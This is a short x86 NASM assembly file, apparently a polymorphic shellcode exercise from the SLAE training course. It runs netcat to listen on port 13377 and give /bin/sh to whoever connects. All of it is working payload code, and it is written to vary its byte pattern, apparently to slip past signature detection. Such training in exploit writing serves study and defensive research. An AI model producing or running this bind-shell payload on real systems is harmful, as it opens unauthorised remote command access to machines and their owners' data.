; Filename: shellcode2.poly.nasm
; Author:  SLAE-935
;
; Purpose: This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker

section .text
    global _start
 
_start:
    shr eax, 16
    push 0x37373333
    push 0x3170762d
    push esp
    pop esi
    ;mov esi, esp
    push eax
    push 0x68732f6e
    push 0x69622f65
    push 0x76766c2d
    push esp
    pop edi
    push eax
    push 0x636e2f2f
    push 0x2f2f2f2f
    push 0x6e69622f
    push esp
    pop ebx
    push eax
    mov edx, eax
    push esi
    push edi
    push ebx
    push esp
    pop ecx
    add al,11
    int 0x80